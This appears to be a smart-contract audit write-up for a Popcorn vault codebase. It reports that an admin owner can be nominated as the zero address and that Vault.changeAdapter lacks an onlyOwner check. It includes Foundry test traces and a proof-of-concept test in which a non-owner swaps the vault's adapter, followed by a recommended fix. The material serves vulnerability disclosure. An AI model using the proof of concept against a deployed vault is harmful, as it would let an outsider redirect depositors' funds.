Finding #1
Should not nominate new admin proxy to address zero, add this test to `test.vault.VaultController.t.sol`:
```
   function test__nominateZeroAddressNewAdminProxyOwner() public {
        controller.nominateNewAdminProxyOwner(address(0));
        assertEq(adminProxy.nominatedOwner(), address(0));
    }
```

 Test output:
```
 ~/latest/2023-01-popcorn │ on main !1 ?1  forge test --match-path test/vault/VaultController.t.sol --match-test "test__nominateZeroAddressNewAdminProxyOwner" -vvvv                              ✔ │ took 8s │ at 23:48:33 
[⠒] Compiling...
No files changed, compilation skipped

Running 1 test for test/vault/VaultController.t.sol:VaultControllerTest
[PASS] test__nominateZeroAddressNewAdminProxyOwner() (gas: 21579)
Traces:
  [21579] VaultControllerTest::test__nominateZeroAddressNewAdminProxyOwner() 
    ├─ [13287] VaultController::nominateNewAdminProxyOwner(0x0000000000000000000000000000000000000000) 
    │   ├─ [5766] AdminProxy::nominateNewOwner(0x0000000000000000000000000000000000000000) 
    │   │   ├─ emit OwnerNominated(newOwner: 0x0000000000000000000000000000000000000000)
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [359] AdminProxy::nominatedOwner() [staticcall]
    │   └─ ← 0x0000000000000000000000000000000000000000
    └─ ← ()

Test result: ok. 1 passed; 0 failed; finished in 7.64ms
```

Finding #2
Missing `onlyOwner` modifier on `src.vault.Vault.changeAdapter` allows anyone to set a new Adapter for this Vault after the quit period has passed. The existing test in `test.vault.Vault.testFail__changeAdapter_NonOwner` is incorrectly implemented to verify the issue and fails on `NotPassedQuitPeriod` rather than properly catching the error of lack of ownership, e.g.
```
~/se/currents/latest/2023-01-popcorn │ on main !2 ?1  forge test --match-path test/vault/Vault.t.sol --match-test "testFail__changeAdapter_NonOwner" -vvvv

[⠊] Compiling...
No files changed, compilation skipped

Running 1 test for test/vault/Vault.t.sol:VaultTest
[PASS] testFail__changeAdapter_NonOwner() (gas: 32770)
Traces:
  [32770] VaultTest::testFail__changeAdapter_NonOwner() 
    ├─ [0] VM::prank(alice: [0x000000000000000000000000000000000000ABcD]) 
    │   └─ ← ()
    ├─ [22509] vault::changeAdapter() 
    │   ├─ [2640] MockERC4626::balanceOf(vault: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
    │   │   └─ ← 0
    │   ├─ [2523] MockERC4626::convertToAssets(0) [staticcall]
    │   │   └─ ← 0
    │   └─ ← "NotPassedQuitPeriod(259200)"
    └─ ← "NotPassedQuitPeriod(259200)"

Test result: ok. 1 passed; 0 failed; finished in 3.50ms
```
PoC:
```  function test__anyoneCanChangeAdapterAfterNewWasProposed() public {
    // Missing onlyOwner modifier allows anyone to Set a new Adapter for this Vault after the quit period has passed.
    MockERC4626 newAdapter = new MockERC4626(IERC20(address(asset)), "Mock Token Vault", "vwTKN");
    uint256 depositAmount = 1 ether;

    // Deposit funds for testing
    asset.mint(alice, depositAmount);
    vm.startPrank(alice);
    asset.approve(address(vault), depositAmount);
    vault.deposit(depositAmount, alice);
    vm.stopPrank();

    // Increase assets in asset Adapter to check hwm and assetCheckpoint later
    asset.mint(address(adapter), depositAmount);
    vault.takeManagementAndPerformanceFees();

    // Preparation to change the adapter
    vault.proposeAdapter(IERC4626(address(newAdapter)));

    vm.warp(block.timestamp + 3 days);

    vm.expectEmit(false, false, false, true, address(vault));
    emit ChangedAdapter(IERC4626(address(adapter)), IERC4626(address(newAdapter)));
    
    vm.startPrank(bob);
    vault.changeAdapter();
    vm.stopPrank();

  }
```

Recommendation: add `onlyOwner` modifier to `changeAdapter` function and refactor `testFail__changeAdapter_NonOwner`


